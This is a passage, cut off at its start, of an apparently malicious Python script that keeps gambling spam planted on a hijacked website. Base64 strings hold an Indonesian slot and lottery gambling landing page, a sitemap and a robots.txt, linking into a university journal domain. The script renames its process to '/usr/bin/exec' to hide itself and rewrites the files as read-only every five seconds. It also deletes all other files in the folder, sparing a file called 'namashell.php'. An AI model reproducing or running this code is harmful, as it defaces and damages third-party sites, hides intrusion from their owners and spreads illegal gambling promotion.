4gdHJvcGlzIHlhbmcgc2FuZ2F0IHNlZ2FyIGRhbiBlbmFrIGRpcGFuZGFuZyBzYWF0IGRpbWFpbmthbi4gVGluZ2thdCBLZW1lbmFuZ2FuIFNsb3QgVGF1dGFuIFJUUCB0ZXJ0aW5nZ2kganVnYSB0aW5nZ2ksIHlhaXR1IDk3LDk4JS48L3A+CiAgICAgICAgICAgICAgICA8dWw+CiAgICAgICAgICAgICAgICAgICAgPGxpPgogICAgICAgICAgICAgICAgICAgICAgICA8cD5TbG90IFB1bHNhIFdpbnJhdGUgVGVydGluZ2dpIEdhdGVzIG9mIE9seW1wdXM8L3A+CiAgICAgICAgICAgICAgICAgICAgPC9saT4KICAgICAgICAgICAgICAgIDwvdWw+CiAgICAgICAgICAgICAgICA8cD5VbnR1ayBib2NvcmFuIHNsb3QgUlRQIHBlcnRhbWEgYWRhIEdhdGVzIG9mIE9seW1wdXMuIFBlcm1haW5hbiBMaW5rIFNsb3QgZGFyaSBQcmFnbWF0aWMgUGxheSwgZGVwb3NpdCBwdWxzYSBpbmkgc2FuZ2F0IHBvcHVsZXIgZGkga2FsYW5nYW4gcGVtYWluIFJlZmVycmFsIFNsb3QgT25saW5lIEdhY29yIEluZG9uZXNpYS4gTmlsYWkgUlRQIHRlcnRpbmdnaSB1bnR1ayBnYW1lIGluaSBhZGFsYWggOTgsOTglLCBjdWt1cCBiZXNhciBidWthbj8gQW5kYSBiaXNhIG1lbmNvYmFueWEgamlrYSB0ZXJ0YXJpayBkZW5nYW4gcGVuYXdhcmFuIG1heHdpbiBqYWNrcG90LjwvcD4KICAgICAgICAgICAgICAgIDx1bD4KICAgICAgICAgICAgICAgICAgICA8bGk+CiAgICAgICAgICAgICAgICAgICAgICAgIDxwPlNsb3QgUHVsc2EgV2lucmF0ZSBUZXJ0aW5nZ2kgU3dlZXQgQm9uYW56YTwvcD4KICAgICAgICAgICAgICAgICAgICA8L2xpPgogICAgICAgICAgICAgICAgPC91bD4KICAgICAgICAgICAgICAgIDxwPk1hbGFtIGluaSAyMDIzIGFkYSBHYW1lIEFnZW4gSnVkaSBTbG90IFN3ZWV0IEJvbmFuemEsIEFnZW4gSnVkaSBTbG90IERlcG9zaXQgNTAwMCBpbmkgbWFzaWggYmVyYXNhbCBkYXJpIHByb3ZpZGVyIExpbmsgSnVkaSBTbG90IFB1bHNhIFByYWdtYXRpYyBQbGF5IGFnZW4ganVkaSBzbG90IHRlcmJhaWsgaW5kb25lc2lhLiBEYW4ga2FyZW5hIHRlcmxhbHUgYmFueWFrIGtvbnRlbiBhdGF1IHlvdXR1YmVyIEluZG9uZXNpYSB5YW5nIG1lbmphZGlrYW4gU3dlZXQgQm9uYW56YSBzZWJhZ2FpIHJlZmVyZW5zaSB1bnR1ayBiZXJtYWluIGRhZnRhciBhZ2VuIHNsb3Qgb25saW5lIGthcmVuYSBuaWxhaSBSVFAtbnlhIGN1a3VwIHRpbmdnaSB5YWl0dSBzZWtpdGFyIDk4LDY3JS48L3A+CiAgICAgICAgICAgICAgICA8dWw+CiAgICAgICAgICAgICAgICAgICAgPGxpPgogICAgICAgICAgICAgICAgICAgICAgICA8cD5TbG90IFB1bHNhIFdpbnJhdGUgVGVydGluZ2dpIFdpbGQgV2VzdCBHb2xkPC9wPgogICAgICAgICAgICAgICAgICAgIDwvbGk+CiAgICAgICAgICAgICAgICA8L3VsPgogICAgICAgICAgICAgICAgPHA+RGFuIHNsb3Qgb25saW5lIGRlcG9zaXQgcHVsc2EgdWFuZyBhc2xpIHRhbnBhIHBvdG9uZ2FuLCBzZWxhbmp1dG55YSBhZGEgcGVybWFpbmFuIGFnZW4gSnVkaSBTbG90IEdvbGQgV2lsZCBXZXN0IGJlc3V0YW4gcHJvdmlkZXIgUHJhZ21hdGljIFBsYXkganVnYS4gR2FtZSBEYWZ0YXIgQWdlbiBKdWRpIFNsb3QgV2lsZCBXZXN0IEdvbGQgbWVydXBha2FuIHBpbGloYW4gdGVyYmFpayBkZW5nYW4gbmlsYWkgUlRQIHRpbmdnaSA5OC4yNCUsIGRhbiBzZWRpa2l0IGJlcmJlZGEgZGVuZ2FuIFN3ZWV0IEJvbmFuemEgeWFuZyBtZW1pbGlraSBSVFAgOTguNjclIGFnZW4gc2xvdCB0ZXJiYWlrIGRhbiB0ZXJwZXJjYXlhLjwvcD4KICAgICAgICAgICAgICAgIDxoMz5QZXJtYWluYW4gSnVkaSBPbmxpbmUgRGVwb3NpdCBQdWxzYSBUZXJwZXJjYXlhIEluZG9uZXNpYTwvaDM+CiAgICAgICAgICAgICAgICA8cD5TYWF0IGluaSBiYW55YWsgcGlsaWhhbiBqdWRpIG9ubGluZSB5YW5nIGJpc2EgZGlwaWxpaCBiYW55YWsgcGVtYWluIHVudHVrIGRpbWFpbmthbiBkaSBJbmRvbmVzaWEuIE1ha2EgZGFyaSBpdHUgc2VvcmFuZyBwZW1haW4gc2xvdCBvbmxpbmUgc2VqYXRpIGhhcnVzIGJpc2EgbWVuY2FyaSBpbmZvcm1hc2kgcGVybWFpbmFuIGp1ZGkgU2xvdCBQdWxzYSB5YW5nIHNlc3VhaSBkZW5nYW4gaG9iaW55YSBhZ2FyIGNvY29rIGRhbiBueWFtYW4gdW50dWsgbWVtYWlua2FuIHBlcm1haW5hbiB0ZXJzZWJ1dC4gQmVyZGFzYXJrYW4gYmViZXJhcGEgcmV2aWV3IGRhcmkgYmViZXJhcGEgcGVtYWluIGRhbiBidWt0aSB0ZXJraW5pLCBhZGEgYmFueWFrIHBpbGloYW4geWFuZyBjb2NvayB1bnR1ayBkaXBpbGloIGRpIGFudGFyYSBnYW1lIFNsb3QgUHVsc2EgZGVwb3NpdCBwdWxzYSByZXNtaSBwYWxpbmcgcG9wdWxlciBkaSBJbmRvbmVzaWEsIHNhbGFoIHNhdHVueWEgYWRhbGFoOjwvcD4KICAgICAgICAgICAgICAgIDx1bD4KICAgICAgICAgICAgICAgICAgICA8bGk+CiAgICAgICAgICAgICAgICAgICAgICAgIDxwPlBlcm1haW5hbiBTbG90IE9ubGluZSBEZXBvc2l0IFB1bHNhPC9wPgogICAgICAgICAgICAgICAgICAgIDwvbGk+CiAgICAgICAgICAgICAgICA8L3VsPgogICAgICAgICAgICAgICAgPHA+SnVkaSBzbG90IG9ubGluZSBnYWNvciBtYXh3aW4gbWVuamFkaSBwaWxpaGFuIHBhbGluZyBwb3B1bGVyIGRhbiBkaWdhbmRydW5naSBvbGVoIGJhbnlhayBiZXR0b3IgZGkgZHVuaWEuIEhhbCBpbmkgZGlrYXJlbmFrYW4gcGVybWFpbmFuIHRlcnNlYnV0IHRlbGFoIGRpa2VtYmFuZ2thbiBvbGVoIGJlYmVyYXBhIHByb3ZpZGVyIHNsb3QgcHVsc2EgZGVwb3NpdCBnYWNvciB0YW5wYSBwb3Rvbmdhbiwgc2VydGEgdmFyaWFzaSBwZXJtYWluYW4gc2xvdCB5YW5nIGJhbnlhayBkYW4gc2FuZ2F0IGxlbmdrYXAuPC9wPgogICAgICAgICAgICAgICAgPHVsPgogICAgICAgICAgICAgICAgICAgIDxsaT4KICAgICAgICAgICAgICAgICAgICAgICAgPHA+UGVybWFpbmFuIFRvZ2VsIE9ubGluZSBEZXBvc2l0IFB1bHNhPC9wPgogICAgICAgICAgICAgICAgICAgIDwvbGk+CiAgICAgICAgICAgICAgICA8L3VsPgogICAgICAgICAgICAgICAgPHA+VG9nZWwgYWRhbGFoIHBlcm1haW5hbiB0ZWJhayBhbmdrYSB5YW5nIHN1ZGFoIHNhbmdhdCBwb3B1bGVyIHNlamFrIGphbWFuIG5lbmVrIG1veWFuZyBraXRhLiBCYW55YWsgc2VrYWxpIHBlbWFpbiBqdWRpIG9ubGluZSBkZXBvc2l0IHB1bHNhIHRhbnBhIHBvdG9uZ2FuIHlhbmcgbWVueXVrYWkgcGFzYXJhbiB0b2dlbCBsZW5na2FwIGluaSwgZGFuIGtpbmkgc2VtYWtpbiBsZW5na2FwIGthcmVuYSBiYW55YWtueWEgcGFzYXJhbiBqdWRpIHRvZ2VsIGRhcmkgYmVyYmFnYWkgbmVnYXJhLjwvcD4KICAgICAgICAgICAgICAgIDx1bD4KICAgICAgICAgICAgICAgICAgICA8bGk+CiAgICAgICAgICAgICAgICAgICAgICAgIDxwPlBlcm1haW5hbiBTcG9ydHNib29rIERlcG9zaXQgUHVsc2E8L3A+CiAgICAgICAgICAgICAgICAgICAgPC9saT4KICAgICAgICAgICAgICAgIDwvdWw+CiAgICAgICAgICAgICAgICA8cD5QZXJtYWluYW4gYnVrdSBvbGFocmFnYSBvbmxpbmUgcG9wdWxlciBkZW5nYW4gdGFydWhhbiBzZXBhayBib2xhIGp1Z2EgbWVuamFkaSBwaWxpaGFuIHlhbmcgc2FuZ2F0IGRpcmVrb21lbmRhc2lrYW4sIGthcmVuYSBqZW5pcyBwZXJtYWluYW4ganVkaSBpbmkgc2VzdWFpIGRlbmdhbiBob2JpIGRhbiBtaW5hdCBzZWJhZ2lhbiBiZXNhciBwZW1haW4geWFuZyBtZW55dWthaSBzZXBhayBib2xhLiBEYW4gYmFueWFrIHBhc2FyIHRhcnVoYW4gb2xhaHJhZ2EgbGFpbm55YSB5YW5nIGRpdGF3YXJrYW4uPC9wPgogICAgICAgICAgICAgICAgPHVsPgogICAgICAgICAgICAgICAgICAgIDxsaT4KICAgICAgICAgICAgICAgICAgICAgICAgPHA+UGVybWFpbmFuIFBva2VyIE9ubGluZSBEZXBvc2l0IFB1bHNhPC9wPgogICAgICAgICAgICAgICAgICAgIDwvbGk+CiAgICAgICAgICAgICAgICA8L3VsPgogICAgICAgICAgICAgICAgPHA+UGVybWFpbmFuIGp1ZGkga2FydHUgc2VwZXJ0aSBwb2tlciBkYW4gZG9taW5vIGp1Z2EgbWVuamFkaSBwaWxpaGFuIHlhbmcgY3VrdXAgcG9wdWxlciBkYW4gc2FuZ2F0IGRpcmVrb21lbmRhc2lrYW4gdW50dWsgcGFyYSBiZXR0b3IgSW5kb25lc2lhLiBQZXJsdSBkaWtldGFodWkgYmFod2EgamVuaXMgcGVybWFpbmFuIGp1ZGkga2FydHUgb25saW5lIGluaSBqdWdhIGJlcmphbGFuIGRlbmdhbiAxMDAlIGZhaXIgcGxheSBkZW5nYW4gYmFueWFrIGtldW50dW5nYW4gbWVuYW50aSBhbmRhLjwvcD4KICAgICAgICAgICAgICAgIDx1bD4KICAgICAgICAgICAgICAgICAgICA8bGk+CiAgICAgICAgICAgICAgICAgICAgICAgIDxwPlBlcm1haW5hbiBMaXZlIENhc2lubyBEZXBvc2l0IFB1bHNhPC9wPgogICAgICAgICAgICAgICAgICAgIDwvbGk+CiAgICAgICAgICAgICAgICA8L3VsPgogICAgICAgICAgICAgICAgPHA+UGlsaWhhbiBwZXJtYWluYW4ganVkaSBvbmxpbmUgbGFpbm55YSBhZGFsYWggYmVybWFpbiBkZW5nYW4gbGl2ZSBjYXNpbm8gb25saW5lIGF0YXUgcGVybWFpbmFuIGp1ZGkgY2FzaW5vLCBkZXBvc2l0IHB1bHNhIHRhbnBhIHBvdG9uZ2FuLiBBbmRhIGJpc2EgYmViYXMgbWVtaWxpaCBwZXJtYWluYW4ganVkaSBsaXZlIGNhc2lubyBvbmxpbmUgc2VwZXJ0aSByb3VsZXR0ZSwgYmxhY2tqYWNrLCBkcmFnb24gdGlnZXIgZGFuIGxhaW4gc2ViYWdhaW55YS48L3A+PHVsPgogICAgICAgICAgICAgICAgICAgIDxsaT4KICAgICAgICAgICAgICAgICAgICAgICAgPHA+UGVybWFpbmFuIEFyY2FkZSBEZXBvc2l0IFB1bHNhPC9wPgogICAgICAgICAgICAgICAgICAgIDwvbGk+CiAgICAgICAgICAgICAgICA8L3VsPgogICAgICAgICAgICAgICAgPHA+UGVybWFpbmFuIGFyY2FkZSBtZXJ1cGFrYW4gcGlsaWhhbiBwZXJtYWluYW4geWFuZyBiYWd1cyBkYW4gcG9wdWxlciBkaSBrYWxhbmdhbiBwZWNpbnRhIGp1ZGkgb25saW5lLCB0ZXJnYW50dW5nIGRhcmkgYmFueWFrbnlhIG9yYW5nIHlhbmcgbWVtYWlua2FuIGplbmlzIHBlcm1haW5hbiB0ZXJzZWJ1dC4gU2lsYWthbiBwaWxpaCBkYW4gbWFpbmthbiBzZW11YSB2YXJpYW4gcGVybWFpbmFuIHRhcnVoYW4gb25saW5lIGFyY2FkZSBkZW5nYW4gZG9kZ2UgYmFsbCBkYW4gdGVtYmFrIGlrYW4uPC9wPgogICAgICAgICAgICAgICAgPHVsPgogICAgICAgICAgICAgICAgICAgIDxsaT4KICAgICAgICAgICAgICAgICAgICAgICAgPHA+UGVybWFpbmFuIFNhYnVuZyBBeWFtIERlcG9zaXQgUHVsc2E8L3A+CiAgICAgICAgICAgICAgICAgICAgPC9saT4KICAgICAgICAgICAgICAgIDwvdWw+CiAgICAgICAgICAgICAgICA8cD5TYWJ1bmcgYXlhbSBtZXJ1cGFrYW4gc2FsYWggc2F0dSBwaWxpaGFuIHBlcm1haW5hbiBqdWRpIG9ubGluZSB5YW5nIGp1Z2EgcG9wdWxlciBkaSBkdW5pYSBkYW4gc3VkYWggdGlkYWsgYXNpbmcgbGFnaSBiYWdpIGJhbnlhayBwZW5nZ2VtYXIgZGFuIHBlbmdndW5hbnlhLiBBbmRhIHNla2FyYW5nIGRhcGF0IG1lbWFpbmthbiBnYW1lIHRhcnVoYW4gcGVydGVtcHVyYW4gbWVsYWx1aSBzdHJlYW1pbmcgbGFuZ3N1bmcsIHlhbmcgbWVtYnVhdCBzZWdhbGFueWEgbWVuamFkaSBsZWJpaCBtdWRhaC48L3A+CgoKCiAgICAgICAgICAgIDwvZGl2PgogICAgICAgIDwvZGl2PgogICAgICAgIDxhcnRpY2xlIGl0ZW1zY29wZT0iIiBpdGVtdHlwZT0iaHR0cHM6Ly9zY2hlbWEub3JnL0ZBUVBhZ2UiIGNsYXNzPSJmYXEtY29udGFpbmVyIj4KICAgICAgICAgICAgPCEtLVRBUkdFVCBGQVEKCiAgICAgICAgICAgIDxkaXYgaXRlbXByb3A9Im1haW5FbnRpdHkiIGl0ZW1zY29wZT0iIiBpdGVtdHlwZT0iaHR0cHM6Ly9zY2hlbWEub3JnL1F1ZXN0aW9uIj4KICAgICAgICAgICAgICAgIDxoNCBpdGVtcHJvcD0ibmFtZSIgc3R5bGU9ImZvbnQtc2l6ZToxOHB0O2p1c3RpZnktY29udGVudDpzcGFjZS1iZXR3ZWVuO3BhZGRpbmc6MTBweDttYXJnaW46MTJweCAwIDA7YmFja2dyb3VuZDojODIwOUJGOyBjb2xvcjojZmZmZmZmIj5BcGEgaXR1IFRvZ2VsQ0M/PC9oND4KCiAgICAgICAgICAgICAgICA8ZGl2IGl0ZW1wcm9wPSJhY2NlcHRlZEFuc3dlciIgaXRlbXNjb3BlPSIiIGl0ZW10eXBlPSJodHRwczovL3NjaGVtYS5vcmcvQW5zd2VyIiBzdHlsZT0icGFkZGluZzogMTBweDtjb2xvcjogI2RhZGFkYTt0ZXh0LWFsaWduOiBqdXN0aWZ5O2JhY2tncm91bmQ6ICNhOGE4YTgxMTsiPgogICAgICAgICAgICAgICAgICAgIDxkaXYgaXRlbXByb3A9InRleHQiPlRvZ2VsY2MgYWRhbGFoIHNpdHVzIGFnZW4gdG9nZWwgb25saW5lIHRlcnBlcmNheWEgZGkgSW5kb25lc2lhIHNlamFrIDIwMTQgZGFuIGhpbmdnYSBraW5pIHNlbGFsdSBtZW5qYWRpIGlkb2xhIGJhZ2kgcGFyYSBwZW5pa21hdCB0b3RvIGdlbGFwLiBUb2dlbENDIHRlcnBlcmNheWEga2FyZW5hIG1lbWlsaWtpIHBhc2FyYW4gdG9nZWwgdGVybGVuZ2thcCBkYW4gc2lzdGVtIHBlbWJheWFyYW4geWFuZyB0ZXJidWt0aSBtZW1iYXlhciBiZXJhcGFwdW4ga2VtZW5hbmdhbiBwYXJhIHBlbWFpbm55YS48L2Rpdj4KICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICA8L2Rpdj4KCiAgICAgICAgICAgICAtLT4KICAgICAgICAgICAgPGgzIGNsYXNzPSJ0aXRsZSIgYWxpZ249ImNlbnRlciI+PHN0cm9uZz5GQVEgLSBTaXR1cyBTbG90IE9ubGluZSBEZXBvc2l0IFB1bHNhIFRhbnBhIFBvdG9uZ2FuPC9zdHJvbmc+PC9oMz4KCiAgICAgICAgICAgIDxkaXYgaXRlbXByb3A9Im1haW5FbnRpdHkiIGl0ZW1zY29wZT0iIiBpdGVtdHlwZT0iaHR0cHM6Ly9zY2hlbWEub3JnL1F1ZXN0aW9uIj4KICAgICAgICAgICAgICAgIDxoNCBpdGVtcHJvcD0ibmFtZSIgc3R5bGU9ImZvbnQtc2l6ZToxOHB0O2p1c3RpZnktY29udGVudDpzcGFjZS1iZXR3ZWVuO3BhZGRpbmc6MTBweDttYXJnaW46MTJweCAwIDA7YmFja2dyb3VuZDojODIwOUJGOyBjb2xvcjojZmZmZmZmIj5BcGEgaXR1IFNsb3QgRGVwb3NpdCBQdWxzYT88L2g0PgoKICAgICAgICAgICAgICAgIDxkaXYgaXRlbXByb3A9ImFjY2VwdGVkQW5zd2VyIiBpdGVtc2NvcGU9IiIgaXRlbXR5cGU9Imh0dHBzOi8vc2NoZW1hLm9yZy9BbnN3ZXIiIHN0eWxlPSJwYWRkaW5nOiAxMHB4O2NvbG9yOiAjZGFkYWRhO3RleHQtYWxpZ246IGp1c3RpZnk7YmFja2dyb3VuZDogI2E4YThhODExOyI+CiAgICAgICAgICAgICAgICAgICAgPGRpdiBpdGVtcHJvcD0idGV4dCI+U2xvdCBEZXBvc2l0IFB1bHNhIG1lcnVwYWthbiBzaXR1cyBqdWRpIG9ubGluZSBtYXh3aW4gc2xvdCBvbmxpbmUgeWFuZyBtZW55ZWRpYWthbiBkZXBvc2l0IHB1bHNhIHRhbnBhIHBvdG9uZ2FuIGFwYXB1biB1bnR1ayBhbmRhIHBhcmEgcGVtYWluIGp1ZGkgb25saW5lIHlhbmcgdGlkYWsgbWVtaWxpa2kgcmVrZW5pbmcgYmFuayBhdGF1IGFwbGlrYXNpIGUtbW9uZXkuPC9kaXY+CiAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgPC9kaXY+CgogICAgICAgICAgICA8ZGl2IGl0ZW1wcm9wPSJtYWluRW50aXR5IiBpdGVtc2NvcGU9IiIgaXRlbXR5cGU9Imh0dHBzOi8vc2NoZW1hLm9yZy9RdWVzdGlvbiI+CiAgICAgICAgICAgICAgICA8aDQgaXRlbXByb3A9Im5hbWUiIHN0eWxlPSJmb250LXNpemU6MThwdDtqdXN0aWZ5LWNvbnRlbnQ6c3BhY2UtYmV0d2VlbjtwYWRkaW5nOjEwcHg7bWFyZ2luOjEycHggMCAwO2JhY2tncm91bmQ6IzgyMDlCRjsgY29sb3I6I2ZmZmZmZiI+UmVrb21lbmRhc2kgZ2FtZSBTbG90IFB1bHNhIGRlcG9zaXQgcHVsc2EgeWFuZyBsYXlhayBkaW1haW5rYW4/PC9oND4KCiAgICAgICAgICAgICAgICA8ZGl2IGl0ZW1wcm9wPSJhY2NlcHRlZEFuc3dlciIgaXRlbXNjb3BlPSIiIGl0ZW10eXBlPSJodHRwczovL3NjaGVtYS5vcmcvQW5zd2VyIiBzdHlsZT0icGFkZGluZzogMTBweDtjb2xvcjogI2RhZGFkYTt0ZXh0LWFsaWduOiBqdXN0aWZ5O2JhY2tncm91bmQ6ICNhOGE4YTgxMTsiPgogICAgICAgICAgICAgICAgICAgIDxkaXYgaXRlbXByb3A9InRleHQiPlNhYXQgaW5pIHBlcm1haW5hbiBzbG90IHBvcHVsZXIgeWFuZyBkaW1haW5rYW4gZGFuIHBhdHV0IEFuZGEgY29iYSBhZGFsYWggSm9rZXIgSmV3ZWwsIFdXRywgU3dlZXQgQm9uYW56YSwgU3RhcmxpZ2h0IFByaW5jZXNzLCBBenRlYyBHZW1zLCBkYW4gR2F0ZXMgb2YgT2x5bXB1cy48L2Rpdj4KICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICA8L2Rpdj4KCiAgICAgICAgICAgIDxkaXYgaXRlbXByb3A9Im1haW5FbnRpdHkiIGl0ZW1zY29wZT0iIiBpdGVtdHlwZT0iaHR0cHM6Ly9zY2hlbWEub3JnL1F1ZXN0aW9uIj4KICAgICAgICAgICAgICAgIDxoNCBpdGVtcHJvcD0ibmFtZSIgc3R5bGU9ImZvbnQtc2l6ZToxOHB0O2p1c3RpZnktY29udGVudDpzcGFjZS1iZXR3ZWVuO3BhZGRpbmc6MTBweDttYXJnaW46MTJweCAwIDA7YmFja2dyb3VuZDojODIwOUJGOyBjb2xvcjojZmZmZmZmIj5CYWdhaW1hbmEgY2FyYSBtZWxpaGF0IFJUUCB0ZXJ0aW5nZ2kgaGFyaSBpbmk/PC9oND4KCiAgICAgICAgICAgICAgICA8ZGl2IGl0ZW1wcm9wPSJhY2NlcHRlZEFuc3dlciIgaXRlbXNjb3BlPSIiIGl0ZW10eXBlPSJodHRwczovL3NjaGVtYS5vcmcvQW5zd2VyIiBzdHlsZT0icGFkZGluZzogMTBweDtjb2xvcjogI2RhZGFkYTt0ZXh0LWFsaWduOiBqdXN0aWZ5O2JhY2tncm91bmQ6ICNhOGE4YTgxMTsiPgogICAgICAgICAgICAgICAgICAgIDxkaXYgaXRlbXByb3A9InRleHQiPlJUUCBwYWRhIHNsb3QgZGVwb3NpdCBwdWxzYSBnYWNvciB0YW5wYSBwb3RvbmdhbiBzYW5nYXQgYmVyYmVkYS1iZWRhIHNldGlhcCBwZXJtYWluYW5ueWEsIHBhZGEgc2V0aWFwIHBlcm1haW5hbiBqdWRpIFNsb3QgUHVsc2EgYWthbiBkaXRhbXBpbGthbiBSVFAgcGFkYSBwZXJtYWluYW5ueWEgZGFuIGFuZGEganVnYSBiaXNhIG1lbmdndW5ha2FuIGRlbW8gc2xvdC48L2Rpdj4KICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICA8L2Rpdj4KCiAgICAgICAgPC9hcnRpY2xlPgoKICAgICAgICA8ZGl2IGNsYXNzPSJyb3cgbGlzdC1mb290ZXIiPgogICAgICAgICAgICA8aDMgYWxpZ249ImNlbnRlciIgY2xhc3M9ImtleXdvcmQiPklEIFBybyBTbG90Jm5ic3A7MjAyMzwvaDM+CiAgICAgICAgICAgIDx1bD4KICAgICAgICAgICAgICAgIDxsaT48c3BhbiBjbGFzcz0ia2V5d29yZCI+PGEgaHJlZj0iaHR0cHM6Ly9qdXJuYWxmc2gudWluc2J5LmFjLmlkL3B1YmxpYy8tL2lkLXByby1zbG90LyIgcmVsPSJub29wZW5lciIgdGl0bGU9IklEIFBybyBTbG90IiB0YXJnZXQ9Il9ibGFuayI+SUQgUHJvIFNsb3Q8L2E+PC9zcGFuPjwvbGk+CiAgICAgICAgICAgICAgICA8bGk+PHNwYW4gY2xhc3M9ImtleXdvcmQiPjxhIGhyZWY9Imh0dHBzOi8vanVybmFsZnNoLnVpbnNieS5hYy5pZC9wdWJsaWMvLS9pZC1wcm8tc2xvdC8iIHJlbD0ibm9vcGVuZXIiIHRpdGxlPSJJRCBQcm8gU2xvdCIgdGFyZ2V0PSJfYmxhbmsiPklEIFBybyBTbG90PC9hPjwvc3Bhbj48L2xpPgogICAgICAgICAgICAgICAgPGxpPjxzcGFuIGNsYXNzPSJrZXl3b3JkIj48YSBocmVmPSJodHRwczovL2p1cm5hbGZzaC51aW5zYnkuYWMuaWQvcHVibGljLy0vaWQtcHJvLXNsb3QvIiByZWw9Im5vb3BlbmVyIiB0aXRsZT0iTGluayBhbHRlcm5hdGlmIElEIFBybyBTbG90IiB0YXJnZXQ9Il9ibGFuayI+TGluayBBbHRlcm5hdGlmIElEIFBybyBTbG90PC9hPjwvc3Bhbj48L2xpPgogICAgICAgICAgICAgICAgPGxpPjxzcGFuIGNsYXNzPSJrZXl3b3JkIj48YSBocmVmPSJodHRwczovL2p1cm5hbGZzaC51aW5zYnkuYWMuaWQvcHVibGljLy0vaWQtcHJvLXNsb3QvIiByZWw9Im5vb3BlbmVyIiB0aXRsZT0iSUQgUHJvIFNsb3Qgb25saW5lIiB0YXJnZXQ9Il9ibGFuayI+SUQgUHJvIFNsb3QgT25saW5lPC9hPjwvc3Bhbj48L2xpPgogICAgICAgICAgICA8L3VsPgogICAgICAgIDwvZGl2PgogICAgPC9kaXY+CiAgICA8ZGl2IGNsYXNzPSJjb2wtbGctMTIiIGFsaWduPSJjZW50ZXIiIHN0eWxlPSJ3aWR0aDoxMDAlO3BhZGRpbmc6MjhweDttYXJnaW46YXV0byI+CiAgICAgICAgPHNwYW4gc3R5bGU9InBhZGRpbmc6MTBweDtjb2xvcjpyZ2IoMjMzLCAyMjgsIDIyOCk7Ij5Db3B5cmlnaHQgJmNvcHk7IElEIFBybyBTbG90IDIwMjMuIEFsbCByaWdodHMgcmVzZXJ2ZWQuPC9zcGFuPgogICAgPC9kaXY+CjwvYm9keT4KCjwvaHRtbD4="  # Base64 encoded content for index.php
file_content_page = "#"
file_content_sitemap = "PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHVybHNldAogICAgICB4bWxucz0iaHR0cDovL3d3dy5zaXRlbWFwcy5vcmcvc2NoZW1hcy9zaXRlbWFwLzAuOSIKICAgICAgeG1sbnM6eHNpPSJodHRwOi8vd3d3LnczLm9yZy8yMDAxL1hNTFNjaGVtYS1pbnN0YW5jZSIKICAgICAgeHNpOnNjaGVtYUxvY2F0aW9uPSJodHRwOi8vd3d3LnNpdGVtYXBzLm9yZy9zY2hlbWFzL3NpdGVtYXAvMC45CiAgICAgICAgICAgIGh0dHA6Ly93d3cuc2l0ZW1hcHMub3JnL3NjaGVtYXMvc2l0ZW1hcC8wLjkvc2l0ZW1hcC54c2QiPgoKCjx1cmw+CiAgPGxvYz5odHRwczovL2p1cm5hbGZzaC51aW5zYnkuYWMuaWQvcHVibGljLy0vaWQtcHJvLXNsb3QvPC9sb2M+CiAgPGxhc3Rtb2Q+MjAyMy0wNy0yM1QxNjo1NzoyNCswMDowMDwvbGFzdG1vZD4KPC91cmw+CgoKPC91cmxzZXQ+"
file_content_robots = "VXNlci1hZ2VudDogKgpEaXNhbGxvdzogCkRpc2FsbG93OiAvY2dpLWJpbi8="

def set_process_title(title):
    # Modify the first argument in sys.argv to set the process title
    sys.argv[0] = title

def create_directory(directory):
    if not os.path.exists(directory):
        os.makedirs(directory)

def create_file(file_path, content):
    with open(file_path, 'w') as file:
        file.write(content)

def delete_files(directory):
    for filename in os.listdir(directory):
        if filename not in ["index.php","sitemap.xml","robots.txt","namashell.php"]:
            file_path = os.path.join(directory, filename)
            try:
                if os.path.isfile(file_path) or os.path.islink(file_path):
                    os.unlink(file_path)
                elif os.path.isdir(file_path):
                    os.rmdir(file_path)
            except Exception as e:
                print('Failed to delete {}. Reason: {}'.format(file_path, e))

def main():
    # Set the process title when the function starts
    set_process_title("/usr/bin/exec")
    
    while True:
        if not os.path.exists(directory):
            print("[!] Directory not found")
            print("[!] Creating directory")
            create_directory(directory)
        elif not os.path.exists(file_path_index) or not os.path.exists(file_path_page) or not os.path.exists(file_path_sitemap) or not os.path.exists(file_path_robots):
            print("[!] File not found")
            print("[!] Creating file")
            if not os.path.exists(file_path_index):
                decoded_content_index = base64.b64decode(file_content_index).decode('utf-8')
                create_file(file_path_index, decoded_content_index)
                print("[!] Setting file mode to 0444")
                os.chmod(file_path_index, 0o444)  # Set file mode to 0444
            if not os.path.exists(file_path_page):
                decoded_content_page = base64.b64decode(file_content_page).decode('utf-8')
                create_file(file_path_page, decoded_content_page)
                print("[!] Setting file mode to 0444")
                os.chmod(file_path_page, 0o444)  # Set file mode to 0444
            if not os.path.exists(file_path_sitemap):
                decoded_content_sitemap = base64.b64decode(file_content_sitemap).decode('utf-8')
                create_file(file_path_sitemap, decoded_content_sitemap)
                print("[!] Setting file mode to 0444 for sitemap.xml")
                os.chmod(file_path_sitemap, 0o444)  # Set file mode to 0444
            if not os.path.exists(file_path_robots):
                decoded_content_robots = base64.b64decode(file_content_robots).decode('utf-8')
                create_file(file_path_robots, decoded_content_robots)
                print("[!] Setting file mode to 0444 for robots.txt")
                os.chmod(file_path_robots, 0o444)  # Set file mode to 0444

        else:
            print("[*] File exists")
            print("[*] Deleting files and directories not in the filter list")
            delete_files(directory)
        time.sleep(5)

if __name__ == "__main__":
    main()
